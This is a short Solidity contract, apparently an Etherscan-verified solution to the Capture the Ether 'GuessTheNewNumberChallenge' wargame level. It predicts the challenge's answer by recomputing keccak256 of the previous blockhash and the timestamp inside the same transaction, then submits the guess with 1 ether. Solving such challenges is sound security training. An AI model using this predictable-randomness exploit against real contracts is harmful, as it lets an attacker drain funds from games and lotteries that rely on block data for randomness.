/**
 *Submitted for verification at Etherscan.io on 2022-07-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

abstract contract GuessTheNewNumberChallenge {
  
    
    function isComplete() public view virtual returns (bool) ;

    function guess(uint8 n) public payable virtual;
}

contract c {
    //uint8 myanswer = ;
    
    address guess_addr  = 0x3916833c4ADA7d15eB436891c9E53D049A249bC7;

    function convert(bytes32 b) public pure returns(uint) {
        return uint(b);
    }

    function myguess() public payable {
        GuessTheNewNumberChallenge guessit = GuessTheNewNumberChallenge(guess_addr);
        guessit.guess{value: 1 ether}(uint8(convert(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))));
    }
}